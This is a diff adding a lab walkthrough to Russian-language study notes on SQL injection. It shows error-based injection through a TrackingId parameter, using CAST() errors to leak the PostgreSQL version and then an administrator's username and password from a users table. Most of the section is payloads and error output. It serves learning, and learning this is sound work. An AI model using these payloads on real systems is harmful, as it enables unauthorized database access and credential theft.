@@ -7,6 +7,7 @@
 [[#Решение более сложного примера]]
 [[#Пример эксплоита для перебора]] 
 [[#Извлечение данных с помощью подробных сообщений об ошибках в SQL]]
+[[#Пример лабораторной работы с помощью подробных сообщений]]
 
 ---
 #### Определение
@@ -177,3 +178,68 @@ CAST((SELECT example_column FROM example_table) AS int)
 ERROR: invalid input syntax for type integer: "Example data"
 ```
 Это так же может быть полезно если ограничение по количеству символов не позволяет запускать условные ответы(те которые мы используем когда перебираем вслепую)
+
+#### Пример лабораторной работы с помощью подробных сообщений 
+Параметр TrackingId уязвим, попробуем `'` и посмотрим что будет в итоге
+```
+TrackingId=cpKirVdq4poOW8DV'
+```
+ломает запрос и возвращает вот такую ошибку: 
+```
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'cpKirVdq4poOW8DV''. Expected char
+```
+ошибка показывает что строка не завершена, лишний символ но ошибка выдала нам весь sql запрос, далее пробуем `--`
+```
+TrackingId=cpKirVdq4poOW8DV'--
+```
+и получаем валидный запрос потому что приложение вернет 200
+потому что по факту получили: 
+```
+SELECT * FROM tracking WHERE id = 'cpKirVdq4poOW8DV'--'
+ ```
+ и все что после `--` оказалось закоменченным
+ следующий шаг это проверка можем ли мы добавить выражения не ломая нашего запроса, с помощью простого условия 
+ ```
+ TrackingId=cpKirVdq4poOW8DV' AND 1=1--
+ ```
+ что тоже возвращает 200 и значит AND выполняется и все нормально а если заменить на `1=2` то вернет 200 но по факту мы знаем что условие не выполнится и запрос вернет 0 строк 
+ Теперь нужно попробовать управляемо уронить приложение, то есть сломать какую то часть как было рассмотрено в теории можно попробовать добавить `CAST()`
+ ```
+ TrackingId=cpKirVdq4poOW8DV' AND 1=CAST(a AS int)--
+ ```
+ приложение отвечает что `ERROR: column "a" does not exist` следовательно база данных пытается интерпретировать `a` как колонку а значит ждет выражения, попробуем вытащить название БД 
+```
+TrackingId=cpKirVdq4poOW8DV' AND 1=CAST((SELECT version()) AS int)--
+```
+сработало на варианте с `PostgreSQL` и получаем 
+```
+ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
+```
+в результате получаем что ошибка действительно возвращает выбранные нами данные теперь когда мы этот знаем можно попробовать 
+```
+TrackingId=cpKirVdq4poOW8DV' AND 1=CAST((SELECT username FROM users) AS int)--
+```
+сервер возвращает ошибку о превышении допустимой длины: 
+```
+Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'cpKirVdq4poOW8DV' AND 1=CAST((SELECT username FROM users) AS'. Expected char
+```
+и мы видим что запрос обрезается, я попробую максимально сократить запрос: 
+```
+TrackingId='AND 1=CAST((SELECT username FROM users) AS int)--
+```
+и получаем что БД возвращает больше одной строчки `ERROR: more than one row returned by a subquery used as an expression`,  следовательно попробуем забрать только одну с помощью LIMIT
+```
+TrackingId='AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+вот наш ответ 
+```
+ERROR: invalid input syntax for type integer: "administrator"
+```
+значит мы получили нашего администратора, теперь просто заберем другую колонку 
+```
+TrackingId='AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+вот мы и получили наш пароль: 
+```
+ERROR: invalid input syntax for type integer: "b55ngmafkybik1a8vxvr"
+```
